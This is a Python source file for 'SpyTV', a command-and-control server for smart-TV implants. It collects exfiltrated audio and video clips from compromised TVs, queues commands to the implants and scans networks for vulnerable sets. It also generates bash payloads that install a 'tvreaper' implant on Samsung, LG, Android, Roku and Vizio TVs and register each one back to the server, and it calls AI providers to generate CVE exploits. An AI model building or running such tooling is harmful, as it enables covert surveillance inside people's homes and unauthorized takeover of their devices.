#!/usr/bin/env python3
"""SpyTV C2 Server: Web-based dashboard for managing TV implants.
Handles audio/video exfiltration, device control, command dispatch,
network scanning, and payload generation.
"""
import json
import os
import base64
import hashlib
import datetime
import threading
import time
import socket
import struct
import subprocess
import platform
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs
from core.cve_scanner import CVEScanner, TV_CVE_DATABASE
from c2_cve_feed import (
    update_cve_database, get_feed, get_all_cves, load_ai_keys, save_ai_keys,
    generate_exploit_for_cve, ai_key_status, render_cve_whitepaper, AI_PROVIDERS,
)

# Device family -> CVE database key
FAMILY_TO_TV_TYPE = {
    "samsung-tizen": "samsung-tizen",
    "tizen-dev": "samsung-tizen",
    "samsung": "samsung-tizen",
    "lg-webos": "lg-webos",
    "webos-dev": "lg-webos",
    "lg": "lg-webos",
    "adb-net": "android-tv",
    "androidtv": "android-tv",
    "android tv": "android-tv",
    "fire tv": "android-tv",
    "roku-ecp": "roku",
    "roku": "roku",
    "roku tv": "roku",
    "vizio-dial": "vizio",
    "vizio": "vizio",
    "hisense": "hisense",
    "tcl": "tcl",
    "chromecast": "chromecast",
    "google tv": "chromecast",
    "google": "chromecast",
}

# Configuration
C2_HOST = "0.0.0.0"
C2_PORT = 8443
STORE_DIR = os.path.join("c2_data", "clips")
DEVICE_FILE = os.path.join("c2_data", "devices.json")
COMMAND_FILE = os.path.join("c2_data", "commands.json")
SCAN_FILE = os.path.join("c2_data", "scans.json")
LOGO_FILE = "logo.png"

os.makedirs(STORE_DIR, exist_ok=True)
os.makedirs(os.path.join(STORE_DIR, "audio"), exist_ok=True)
os.makedirs(os.path.join(STORE_DIR, "video"), exist_ok=True)

# Device registry
devices = {}
devices_lock = threading.Lock()

# Command queue
commands = {}
commands_lock = threading.Lock()

# Scan results
scans = []
scans_lock = threading.Lock()

# CVE scanner instance
cve_scanner = CVEScanner()

# CVE feed update state (updated in background at startup)
cve_feed_status = {"updating": False, "last_result": None, "new": 0}


def utc_now_iso():
    """Timezone-aware UTC timestamp in the legacy '...Z' string format."""
    return datetime.datetime.now(datetime.timezone.utc).isoformat().replace("+00:00", "")


def get_local_ip():
    """Get the local IP address of this machine."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        return "127.0.0.1"


def load_devices():
    global devices
    if os.path.exists(DEVICE_FILE):
        try:
            with open(DEVICE_FILE, 'r') as f:
                devices = json.load(f)
        except (json.JSONDecodeError, IOError):
            devices = {}


def save_devices():
    with devices_lock:
        try:
            with open(DEVICE_FILE, 'w') as f:
                json.dump(devices, f, indent=2)
        except IOError:
            pass


def load_commands():
    global commands
    if os.path.exists(COMMAND_FILE):
        try:
            with open(COMMAND_FILE, 'r') as f:
                commands = json.load(f)
        except (json.JSONDecodeError, IOError):
            commands = {}


def save_commands():
    with commands_lock:
        try:
            with open(COMMAND_FILE, 'w') as f:
                json.dump(commands, f, indent=2)
        except IOError:
            pass


def load_scans():
    global scans
    if os.path.exists(SCAN_FILE):
        try:
            with open(SCAN_FILE, 'r') as f:
                scans = json.load(f)
        except (json.JSONDecodeError, IOError):
            scans = []


def save_scans():
    with scans_lock:
        try:
            with open(SCAN_FILE, 'w') as f:
                json.dump(scans, f, indent=2)
        except IOError:
            pass


def get_device_id(ip):
    return hashlib.sha1(ip.encode()).hexdigest()[:12]


def scan_network(cidr=None):
    """Scan local network for vulnerable TVs using port scanning."""
    if cidr is None:
        local_ip = get_local_ip()
        cidr = f"{local_ip.rsplit('.', 1)[0]}.0/24"

    results = []
    base_ip = cidr.split('/')[0].rsplit('.', 1)[0]

    # Common TV ports to scan
    tv_ports = [5555, 22, 80, 554, 8080, 1900, 7676, 3000, 8060, 36669, 8009, 49152]

    for i in range(1, 255):
        ip = f"{base_ip}.{i}"
        open_ports = []
        for port in tv_ports:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(0.3)
                result = s.connect_ex((ip, port))
                s.close()
                if result == 0:
                    open_ports.append(port)
            except Exception:
                pass

        if open_ports:
            # Try to identify device type
            device_type = "Unknown"
            if 5555 in open_ports:
                device_type = "Android TV/Fire TV"
            elif 7676 in open_ports:
                device_type = "Samsung Tizen"
            elif 3000 in open_ports:
                device_type = "LG webOS"
            elif 8060 in open_ports:
                device_type = "Roku"
            elif 36669 in open_ports:
                device_type = "Vizio"
            elif 8009 in open_ports:
                device_type = "Chromecast"

            results.append({
                "ip": ip,
                "open_ports": open_ports,
                "device_type": device_type,
                "vulnerable": len(open_ports) > 0,
                "scanned_at": utc_now_iso()
            })

    return results


def generate_payload(target_ip, family, c2_ip):
    """Generate an exploit payload that connects back to the C2."""
    payload_url = f"http://{c2_ip}:{C2_PORT}/api/exfil"

    if family == "tizen-dev":
        payload = f"""#!/bin/bash
# Tizen Dev Mode Exploit Payload
# Target: {target_ip}
# C2: {c2_ip}:{C2_PORT}
echo "Installing Tizen implant on {target_ip}..."
sdb connect {target_ip}:26101
sdb install tvreaper.wgt
# Register with C2
curl -X POST http://{c2_ip}:{C2_PORT}/api/register \\
  -H "Content-Type: application/json" \\
  -d '{{"ip":"{target_ip}","family":"Samsung(Tizen)","entry":"tizen-dev"}}'
echo "Implant installed. C2: {c2_ip}"
"""
    elif family == "webos-dev":
        payload = f"""#!/bin/bash
# webOS ares-install Exploit Payload
# Target: {target_ip}
# C2: {c2_ip}:{C2_PORT}
echo "Installing webOS implant on {target_ip}..."
ares-install --device tv@{target_ip} tvreaper.ipk
curl -X POST http://{c2_ip}:{C2_PORT}/api/register \\
  -H "Content-Type: application/json" \\
  -d '{{"ip":"{target_ip}","family":"LG(webOS)","entry":"webos-dev"}}'
echo "Implant installed. C2: {c2_ip}"
"""
    elif family == "adb-net":
        payload = f"""#!/bin/bash
# Android TV ADB Exploit Payload
# Target: {target_ip}
# C2: {c2_ip}:{C2_PORT}
echo "Installing Android TV implant on {target_ip}..."
adb connect {target_ip}:5555
adb -s {target_ip}:5555 install tvreaper.apk
curl -X POST http://{c2_ip}:{C2_PORT}/api/register \\
  -H "Content-Type: application/json" \\
  -d '{{"ip":"{target_ip}","family":"AndroidTV","entry":"adb-net"}}'
echo "Implant installed. C2: {c2_ip}"
"""
    elif family == "roku-ecp":
        payload = f"""#!/bin/bash
# Roku ECP Exploit Payload
# Target: {target_ip}
# C2: {c2_ip}:{C2_PORT}
echo "Installing Roku implant on {target_ip}..."
curl -X POST http://{target_ip}:8060/install/851
curl -X POST http://{c2_ip}:{C2_PORT}/api/register \\
  -H "Content-Type: application/json" \\
  -d '{{"ip":"{target_ip}","family":"RokuTV","entry":"roku-ecp"}}'
echo "Implant installed. C2: {c2_ip}"
"""
    elif family == "vizio-dial":
        payload = f"""#!/bin/bash
# Vizio DIAL Exploit Payload
# Target: {target_ip}
# C2: {c2_ip}:{C2_PORT}
echo "Installing Vizio implant on {target_ip}..."
curl -X POST http://{target_ip}:24825/apps/com.forge.tvreaper
curl -X POST http://{c2_ip}:{C2_PORT}/api/register \\
  -H "Content-Type: application/json" \\
  -d '{{"ip":"{target_ip}","family":"Vizio","entry":"vizio-dial"}}'
echo "Implant installed. C2: {c2_ip}"
"""
    else:
        payload = f"""#!/bin/bash
# Generic DLNA Exploit Payload
# Target: {target_ip}
# C2: {c2_ip}:{C2_PORT}
echo "Attempting DLNA injection on {target_ip}..."
curl -X POST http://{target_ip}:49152/upnp/control/AVTransport \\
  -H "Content-Type: text/xml" \\
  -H "SOAPAction: urn:schemas-upnp-org:service:AVTransport:1#SetAVTransportURI" \\
  -d '<?xml version="1.0"?><s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/"><s:Body><u:SetAVTransportURI xmlns:u="urn:schemas-upnp-org:service:AVTransport:1"><InstanceID>0</InstanceID><CurrentURI>http://{c2_ip}/tvreaper.js</CurrentURI></u:SetAVTransportURI></s:Body></s:Envelope>'
curl -X POST http://{c2_ip}:{C2_PORT}/api/register \\
  -H "Content-Type: application/json" \\
  -d '{{"ip":"{target_ip}","family":"Unknown","entry":"dlna"}}'
echo "Implant attempted. C2: {c2_ip}"
"""

    return payload


class C2Handler(BaseHTTPRequestHandler):
    def log_message(self, format, *args):
        pass

    def do_GET(self):
        parsed = urlparse(self.path)
        path = parsed.path

        if path == "/" or path == "/index.html":
            self.serve_dashboard()
        elif path == "/api/devices":
            self.serve_devices()
        elif path == "/api/clips":
            self.serve_clips()
        elif path.startswith("/api/clip/"):
            self.serve_clip(path)
        elif path == "/api/commands":
            self.serve_commands()
        elif path == "/api/scans":
            self.serve_scans()
        elif path == "/api/cves":
            self.serve_cves()
        elif path == "/api/cve/feed":
            self.serve_cve_feed()
        elif path.startswith("/api/cve/whitepaper/"):
            self.serve_cve_whitepaper(path)
        elif path == "/api/local_ip":
            self.send_json(200, {"ip": get_local_ip()})
        elif path == "/api/ai-keys":
            self.serve_ai_keys_status()
        elif path.startswith("/docs/"):
            self.serve_doc(path)
        elif path == "/logo.png":
            self.serve_logo()
        else:
            self.send_error(404)

    def do_POST(self):
        parsed = urlparse(self.path)
        path = parsed.path

        if path == "/api/register":
            self.handle_register()
        elif path == "/api/exfil":
            self.handle_exfil()
        elif path == "/api/command":
            self.handle_command()
        elif path == "/api/poll":
            self.handle_poll()
        elif path == "/api/scan":
            self.handle_scan()
        elif path == "/api/payload":
            self.handle_payload()
        elif path == "/api/cve/update":
            self.serve_cve_update()
        elif path == "/api/cve/patch":
            self.serve_cve_patch()
        elif path == "/api/cve/generate":
            self.serve_cve_generate()
        elif path == "/api/ai-keys":
            self.serve_ai_keys_save()
        else:
            self.send_error(404)

    def serve_dashboard(self):
        html_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "c2_dashboard.html")
        try:
            with open(html_path, 'r', encoding='utf-8') as f:
                html = f.read()
            self.send_response(200)
            self.send_header("Content-Type", "text/html; charset=utf-8")
            self.end_headers()
            self.wfile.write(html.encode('utf-8'))
        except IOError:
            self.send_error(404)

    def serve_devices(self):
        with devices_lock:
            self.send_json(200, list(devices.values()))

    def serve_clips(self):
        clips = []
        for root, dirs, files in os.walk(STORE_DIR):
            for f in files:
                if f.endswith(('.wav', '.jpeg', '.jpg', '.png', '.ts')):
                    rel = os.path.relpath(os.path.join(root, f), STORE_DIR)
                    parts = rel.replace('\\', '/').split('/')
                    if len(parts) >= 2:
                        kind = parts[0]
                        fname = parts[-1]
                        device_id = fname.split('_')[0] if '_' in fname else 'unknown'
                        clips.append({
                            "id": hashlib.sha1(rel.encode()).hexdigest()[:12],
                            "device_id": device_id,
                            "kind": kind,
                            "filename": fname,
                            "path": rel,
                            "size": os.path.getsize(os.path.join(root, f)),
                            "timestamp": os.path.getctime(os.path.join(root, f))
                        })
        self.send_json(200, clips)

    def serve_clip(self, path):
        clip_id = path.split("/")[-1]
        for root, dirs, files in os.walk(STORE_DIR):
            for f in files:
                rel = os.path.relpath(os.path.join(root, f), STORE_DIR)
                cid = hashlib.sha1(rel.encode()).hexdigest()[:12]
                if cid == clip_id:
                    full_path = os.path.join(root, f)
                    content_type = "audio/wav" if f.endswith('.wav') else \
                                   "image/jpeg" if f.endswith(('.jpeg', '.jpg')) else \
                                   "image/png" if f.endswith('.png') else \
                                   "video/mp2t" if f.endswith('.ts') else "application/octet-stream"
                    try:
                        with open(full_path, 'rb') as fh:
                            data = fh.read()
                        self.send_response(200)
                        self.send_header("Content-Type", content_type)
                        self.send_header("Content-Length", str(len(data)))
                        self.end_headers()
                        self.wfile.write(data)
                        return
                    except IOError:
                        pass
        self.send_error(404)

    def serve_commands(self):
        with commands_lock:
            self.send_json(200, commands)

    def serve_scans(self):
        with scans_lock:
            self.send_json(200, scans)

    def serve_logo(self):
        try:
            with open(LOGO_FILE, 'rb') as f:
                data = f.read()
            self.send_response(200)
            self.send_header("Content-Type", "image/png")
            self.send_header("Content-Length", str(len(data)))
            self.end_headers()
            self.wfile.write(data)
        except IOError:
            self.send_error(404)

    def serve_cve_feed(self):
        """CVE feed for the dashboard sidebar (entries + links + AI status)."""
        try:
            feed = get_feed()
            feed["updating"] = cve_feed_status["updating"]
            feed["last_result"] = cve_feed_status["last_result"]
            self.send_json(200, feed)
        except Exception as e:
            self.send_json(500, {"error": str(e)})

    def serve_cve_whitepaper(self, path):
        """Render a per-CVE whitepaper as HTML."""
        cve_id = path.rsplit("/", 1)[-1]
        html = render_cve_whitepaper(cve_id)
        if not html:
            self.send_error(404)
            return
        data = html.encode("utf-8")
        self.send_response(200)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.send_header("Content-Length", str(len(data)))
        self.end_headers()
        self.wfile.write(data)

    def serve_cve_generate(self):
        """Generate an exploit module for a CVE via the configured AI provider."""
        try:
            length = int(self.headers.get('Content-Length', 0))
            body = self.rfile.read(length)
            data = json.loads(body)
            cve_id = data.get('cve_id', '')
            provider = data.get('provider') or None
            model = data.get('model') or None

            code, error = generate_exploit_for_cve(cve_id, provider, model)
            if error:
                self.send_json(400, {"error": error})
            else:
                self.send_json(200, {
                    "cve_id": cve_id, "code": code,
                    "provider": provider or "auto",
                    "model": model or "default",
                })
        except Exception as e:
            self.send_json(500, {"error": str(e)})

    def serve_ai_keys_status(self):
        """Masked AI provider key status for the dashboard."""
        try:
            self.send_json(200, ai_key_status())
        except Exception as e:
            self.send_json(500, {"error": str(e)})

    def serve_ai_keys_save(self):
        """Save AI provider API keys from the dashboard."""
        try:
            length = int(self.headers.get('Content-Length', 0))
            body = self.rfile.read(length)
            data = json.loads(body)
            save_ai_keys(data)
            self.send_json(200, {"status": "ok", "ai": ai_key_status()})
        except Exception as e:
            self.send_json(500, {"error": str(e)})

    def serve_doc(self, path):
        """Serve docs/*.md rendered as HTML so guides are viewable from the C2."""
        import html as html_mod
        name = path[len("/docs/"):]
        if not name.endswith(".md") or "/" in name or "\\" in name or ".." in name:
            self.send_error(404)
            return
        doc_path = os.path.join(os.path.dirname(os.path.abspath(__file__)),
                                "docs", name)
        try:
            with open(doc_path, 'r', encoding='utf-8') as fh:
                md = fh.read()
        except IOError:
            self.send_error(404)
            return

        # Minimal, safe markdown -> HTML rendering (headers, code, lists, links).
        out_lines = []
        in_code = False
        for line in md.splitlines():
            esc = html_mod.escape(line)
            if line.startswith("```"):
                if in_code:
                    out_lines.append("</code></pre>")
                    in_code = False
                else:
                    out_lines.append("<pre><code>")
                    in_code = True
                continue
            if in_code:
                out_lines.append(esc)
                continue
            if line.startswith("#"):
                level = len(line) - len(line.lstrip("#"))
                level = min(max(level, 1), 5)
                out_lines.append(
                    f"<h{level}>{html_mod.escape(line.lstrip('# ').strip())}</h{level}>")
            elif line.startswith(("- ", "* ")):
                out_lines.append(f"<li>{html_mod.escape(line[2:].strip())}</li>")
            elif line.strip() == "":
                out_lines.append("<br>")
            else:
                out_lines.append(f"<p>{esc}</p>")
        body = "\n".join(out_lines)
        page = f"""<!DOCTYPE html><html lang="en"><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>{html_mod.escape(name)} — SpyTV Docs</title>
<style>
 body {{ background:#0B0E14; color:#F3F4F6; font-family:-apple-system,'Segoe UI',Roboto,sans-serif;
        max-width:860px; margin:0 auto; padding:32px; line-height:1.65; }}
 h1,h2,h3,h4,h5 {{ color:#F3F4F6; margin-top:24px; }}
 h1 {{ font-size:22px; }} h2 {{ font-size:17px; }} h3 {{ font-size:14px; }}
 p,li {{ color:#D1D5DB; font-size:14px; }}
 pre {{ background:#111827; border:1px solid #1F2937; border-radius:8px;
       padding:14px; overflow-x:auto; }}
 code {{ font-family:Consolas,'SF Mono',monospace; font-size:13px; color:#93C5FD; }}
 a {{ color:#3B82F6; }} .back {{ font-size:13px; }}
</style></head><body>
<p class="back"><a href="/">&#8592; Back to C2 Dashboard</a> &middot;
<a href="/docs/TROUBLESHOOTING.md">Troubleshooting</a> &middot;
<a href="/docs/C2_DASHBOARD.md">C2 Dashboard Guide</a></p>
{body}</body></html>"""
        data = page.encode("utf-8")
        self.send_response(200)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.send_header("Content-Length", str(len(data)))
        self.end_headers()
        self.wfile.write(data)

    def serve_cves(self):
        """Return all known CVEs from the TV vulnerability database."""
        all_cves = []
        for tv_type, info in TV_CVE_DATABASE.items():
            for cve in info["cves"]:
                all_cves.append({
                    **cve,
                    "tv_type": tv_type,
                    "device_name": info["name"],
                    "ports": info["ports"],
                    "bluetooth": info["bluetooth"],
                    "ssh": info["ssh"],
                })
        self.send_json(200, all_cves)

    def serve_cve_update(self):
        """Fetch new CVEs from NVD (background) and kick off exploit generation.

        Returns immediately with the current feed; the update thread logs new
        entries to CVE_UPDATES.log in the repo root and regenerates the feed.
        """
        if cve_feed_status["updating"]:
            self.send_json(200, {"status": "updating", "feed": get_feed()})
            return

        def _run():
            cve_feed_status["updating"] = True
            try:
                new = update_cve_database()
                cve_feed_status["new"] = len(new)
                cve_feed_status["last_result"] = (
                    f"{len(new)} new CVE(s) ingested"
                    if new else "No new CVEs")
                print(f"[CVE] {cve_feed_status['last_result']} — "
                      f"logged to CVE_UPDATES.log")
            except Exception as e:  # noqa: BLE001
                cve_feed_status["last_result"] = f"error: {e}"
                print(f"[CVE] update failed: {e}")
            finally:
                cve_feed_status["updating"] = False

        threading.Thread(target=_run, daemon=True).start()
        self.send_json(200, {"status": "updating", "feed": get_feed()})

    def serve_cve_patch(self):
        """Execute the remediation commands for a matched TV (Patch button).

        Runs the device-family patch commands against the target, capturing
        per-command output so the dashboard can show what was fixed.
        """
        try:
            length = int(self.headers.get('Content-Length', 0))
            body = self.rfile.read(length)
            data = json.loads(body)
            ip = data.get('ip', '')
            tv_type = data.get('tv_type', '')
            family = data.get('family', '')

            if not tv_type and family:
                tv_type = FAMILY_TO_TV_TYPE.get(family.lower().split("(")[0].strip(),
                                                family.lower())
            if not ip or not tv_type or tv_type not in TV_CVE_DATABASE:
                self.send_json(400, {
                    "error": "Missing/unknown ip or tv_type",
                    "known_types": list(TV_CVE_DATABASE.keys()),
                })
                return

            import shlex
            patches = cve_scanner.get_patch_commands(tv_type)
            patch_results = []
            for cmd in patches:
                cmd_formatted = cmd.replace("{ip}", ip)
                entry = {"command": cmd_formatted, "status": "executed",
                         "output": "", "returncode": 0}
                if cmd_formatted.startswith("echo "):
                    entry["output"] = cmd_formatted[5:].strip("'\"")
                else:
                    try:
                        proc = subprocess.run(
                            shlex.split(cmd_formatted),
                            capture_output=True, text=True, timeout=45)
                        entry["returncode"] = proc.returncode
                        entry["status"] = "ok" if proc.returncode == 0 else "failed"
                        entry["output"] = (proc.stdout or proc.stderr or "")[:500]
                    except FileNotFoundError:
                        entry["status"] = "skipped"
                        entry["output"] = "tool not installed on operator host"
                    except subprocess.TimeoutExpired:
                        entry["status"] = "timeout"
                        entry["output"] = "command timed out after 45s"
                    except Exception as e:  # noqa: BLE001
                        entry["status"] = "error"
                        entry["output"] = str(e)
                patch_results.append(entry)

            # Remove the device's vulnerable CVEs from its record + mark patched.
            with devices_lock:
                for dev in devices.values():
                    if dev.get("ip") == ip:
                        dev["patched"] = True
                        dev["patched_at"] = utc_now_iso()
                        dev["patched_cves"] = TV_CVE_DATABASE[tv_type]["cves"]
            save_devices()  # acquires devices_lock itself — must be outside the block

            ok = sum(1 for p in patch_results if p["status"] in ("ok", "executed"))
            self.send_json(200, {
                "status": "ok" if ok else "partial",
                "ip": ip,
                "tv_type": tv_type,
                "patched": ok,
                "total": len(patch_results),
                "cves_fixed": [c["id"] for c in TV_CVE_DATABASE[tv_type]["cves"]],
                "patches": patch_results,
            })
        except Exception as e:
            self.send_json(500, {"error": str(e)})

    def handle_register(self):
        try:
            length = int(self.headers.get('Content-Length', 0))
            body = self.rfile.read(length)
            data = json.loads(body)
            ip = data.get('ip', '')
            family = data.get('family', 'unknown')
            entry = data.get('entry', 'unknown')
            if not ip:
                self.send_json(400, {"error": "Missing IP"})
                return
            device_id = get_device_id(ip)
            with devices_lock:
                devices[device_id] = {
                    "id": device_id,
                    "ip": ip,
                    "family": family,
                    "entry": entry,
                    "status": "online",
                    "last_seen": utc_now_iso(),
                    "registered_at": devices.get(device_id, {}).get("registered_at",
                        utc_now_iso())
                }
            save_devices()
            self.send_json(200, {"status": "ok", "device_id": device_id})
        except (json.JSONDecodeError, IOError) as e:
            self.send_json(400, {"error": str(e)})

    def handle_exfil(self):
        try:
            length = int(self.headers.get('Content-Length', 0))
            body = self.rfile.read(length)
            content_type = self.headers.get('Content-Type', '')
            device_id = self.headers.get('X-Device-ID', 'unknown')
            kind = self.headers.get('X-Clip-Kind', 'audio')

            if 'multipart/form-data' in content_type:
                boundary = content_type.split('boundary=')[-1].strip()
                parts = body.split(f'--{boundary}'.encode())
                for part in parts:
                    if b'filename=' in part:
                        header_end = part.find(b'\r\n\r\n')
                        if header_end > 0:
                            file_data = part[header_end + 4:]
                            if file_data.endswith(b'\r\n'):
                                file_data = file_data[:-2]
                            break
                else:
                    file_data = body
            else:
                file_data = body

            timestamp = datetime.datetime.now(datetime.timezone.utc).strftime('%H%M%S')
            date_dir = datetime.datetime.now(datetime.timezone.utc).strftime('%Y%m%d')
            kind_dir = os.path.join(STORE_DIR, kind, date_dir)
            os.makedirs(kind_dir, exist_ok=True)
            filename = f"{device_id}_{timestamp}.{'wav' if kind == 'audio' else 'jpeg'}"
            filepath = os.path.join(kind_dir, filename)
            with open(filepath, 'wb') as f:
                f.write(file_data)

            updated = False
            with devices_lock:
                if device_id in devices:
                    devices[device_id]["last_seen"] = utc_now_iso()
                    devices[device_id]["status"] = "online"
                    updated = True
            if updated:
                save_devices()  # never call while holding devices_lock (non-reentrant)

            self.send_json(200, {"status": "ok", "filename": filename})
        except Exception as e:
            self.send_json(500, {"error": str(e)})

    def handle_command(self):
        try:
            length = int(self.headers.get('Content-Length', 0))
            body = self.rfile.read(length)
            data = json.loads(body)
            device_id = data.get('device_id', '')
            command = data.get('command', '')
            params = data.get('params', {})

            if not device_id or not command:
                self.send_json(400, {"error": "Missing device_id or command"})
                return

            with commands_lock:
                if device_id not in commands:
                    commands[device_id] = []
                commands[device_id].append({
                    "command": command,
                    "params": params,
                    "timestamp": utc_now_iso(),
                    "status": "pending"
                })
            save_commands()
            self.send_json(200, {"status": "ok"})
        except (json.JSONDecodeError, IOError) as e:
            self.send_json(400, {"error": str(e)})

    def handle_poll(self):
        try:
            length = int(self.headers.get('Content-Length', 0))
            body = self.rfile.read(length)
            data = json.loads(body)
            device_id = data.get('device_id', '')

            with commands_lock:
                device_commands = commands.get(device_id, [])
                pending = [c for c in device_commands if c["status"] == "pending"]
                for c in pending:
                    c["status"] = "delivered"
                commands[device_id] = [c for c in device_commands if c["status"] != "delivered"]

            updated = False
            with devices_lock:
                if device_id in devices:
                    devices[device_id]["last_seen"] = utc_now_iso()
                    devices[device_id]["status"] = "online"
                    updated = True
            if updated:
                save_devices()  # never call while holding devices_lock (non-reentrant)

            self.send_json(200, {"commands": pending})
        except (json.JSONDecodeError, IOError) as e:
            self.send_json(400, {"error": str(e)})

    def handle_scan(self):
        try:
            length = int(self.headers.get('Content-Length', 0))
            body = self.rfile.read(length)
            data = json.loads(body)
            cidr = data.get('cidr', None)

            results = scan_network(cidr)

            # Enrich with CVE-database matching: add the vulnerability
            # signature ports for every known TV family so those TVs are
            # discovered too, then attach the CVE list per finding.
            cve_ports = sorted({p for info in TV_CVE_DATABASE.values()
                                for p in info["ports"]})
            scanned_ips = {r["ip"] for r in results}
            extra_ports = [p for p in cve_ports
                           if p not in (5555, 22, 80, 8080, 8060, 36669)]
            for r in results:
                for port in extra_ports:
                    if port in r["open_ports"]:
                        continue
                    try:
                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        s.settimeout(0.3)
                        if s.connect_ex((r["ip"], port)) == 0:
                            r["open_ports"].append(port)
                        s.close()
                    except Exception:
                        pass

            # CVE-scan pass over the whole range (picks up families the
            # generic pass missed, e.g. Samsung 26101 / LG 30000 / Hisense 56789).
            try:
                cve_findings = cve_scanner.scan_network(cidr)
            except Exception:
                cve_findings = []
            by_ip = {r["ip"]: r for r in results}
            for f in cve_findings:
                if f["ip"] in by_ip:
                    tgt = by_ip[f["ip"]]
                    tgt["tv_type"] = f["tv_type"]
                    tgt["device_type"] = f["name"]
                    tgt["cves"] = f["cves"]
                    tgt["mac"] = f.get("mac", "Unknown")
                    tgt["bluetooth"] = f.get("bluetooth", False)
                    tgt["ssh"] = f.get("ssh", False)
                    tgt["patch_available"] = f.get("patch_available", False)
                    for port in f["open_ports"]:
                        if port not in tgt["open_ports"]:
                            tgt["open_ports"].append(port)
                elif f["ip"] not in scanned_ips:
                    results.append(f)
                    by_ip[f["ip"]] = f

            # Attach CVE details to every finding that matched a family.
            for r in results:
                if r.get("cves"):
                    r["vulnerable"] = True
                    r["cve_ids"] = [c["id"] for c in r["cves"]]
                    r["severity"] = max(
                        (c.get("severity") or "LOW" for c in r["cves"]),
                        key=lambda s: ["LOW", "MEDIUM", "HIGH", "CRITICAL"].index(s)
                        if s in ("LOW", "MEDIUM", "HIGH", "CRITICAL") else 0)
                else:
                    tv_type, info = cve_scanner.detect_tv_type(
                        r["ip"], r.get("open_ports", []))
                    if info:
                        r["tv_type"] = tv_type
                        r["name"] = info["name"]
                        r["cves"] = info["cves"]
                        r["cve_ids"] = [c["id"] for c in info["cves"]]
                        r["vulnerable"] = True

            with scans_lock:
                scans.extend(results)
                # Keep only last 100 scans
                scans[:] = scans[-100:]
                save_scans()

            self.send_json(200, {"status": "ok", "found": len(results), "results": results})
        except Exception as e:
            self.send_json(500, {"error": str(e)})

    def handle_payload(self):
        try:
            length = int(self.headers.get('Content-Length', 0))
            body = self.rfile.read(length)
            data = json.loads(body)
            target_ip = data.get('target_ip', '')
            family = data.get('family', 'dlna')
            c2_ip = data.get('c2_ip', get_local_ip())

            if not target_ip:
                self.send_json(400, {"error": "Missing target_ip"})
                return

            payload = generate_payload(target_ip, family, c2_ip)
            self.send_json(200, {"status": "ok", "payload": payload, "target_ip": target_ip, "family": family, "c2_ip": c2_ip})
        except Exception as e:
            self.send_json(500, {"error": str(e)})

    def send_json(self, code, data):
        self.send_response(code)
        self.send_header("Content-Type", "application/json")
        self.end_headers()
        self.wfile.write(json.dumps(data).encode())


def main():
    load_devices()
    load_commands()
    load_scans()

    # Auto-update the CVE feed on every C2 start (background — NVD is
    # rate-limited, so the server comes up immediately). New entries are
    # logged to CVE_UPDATES.log in the repo root and appear in the feed.
    def _startup_cve_update():
        cve_feed_status["updating"] = True
        try:
            new = update_cve_database()
            cve_feed_status["new"] = len(new)
            cve_feed_status["last_result"] = (
                f"{len(new)} new CVE(s) ingested" if new else "No new CVEs")
            print(f"[CVE] startup update: {cve_feed_status['last_result']} "
                  f"(CVE_UPDATES.log)")
        except Exception as e:  # noqa: BLE001
            cve_feed_status["last_result"] = f"error: {e}"
            print(f"[CVE] startup update failed (feed still available): {e}")
        finally:
            cve_feed_status["updating"] = False

    print("Starting CVE feed update in background...")
    threading.Thread(target=_startup_cve_update, daemon=True).start()

    server = HTTPServer((C2_HOST, C2_PORT), C2Handler)
    local_ip = get_local_ip()
    print(f"C2 Server running on http://{C2_HOST}:{C2_PORT}")
    print(f"Local IP: {local_ip}")
    print(f"Dashboard: http://{local_ip}:{C2_PORT}/")
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\nShutting down C2...")
        server.shutdown()


if __name__ == "__main__":
    main()
